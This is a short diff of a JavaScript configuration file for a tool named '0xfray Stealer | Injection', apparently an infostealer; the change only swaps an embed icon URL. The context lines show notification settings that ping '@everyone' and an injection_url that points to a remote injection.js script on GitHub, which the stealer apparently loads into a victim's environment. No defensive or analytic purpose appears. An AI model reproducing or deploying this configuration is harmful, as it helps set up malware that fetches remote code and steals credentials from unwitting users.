@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: '0xfray Stealer | Injection', 
-  embed_icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROHxr0YedH5BvxnsA-zpM1y8Aj1szMuDa8BQ&s'.replace(/ /g, '%20'), 
+  embed_icon: 'https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/QI8YOAIHGLJSHBOIQ/-OSJG-OJBIWEHGP9/refs/heads/main/injection.js', 
   /**
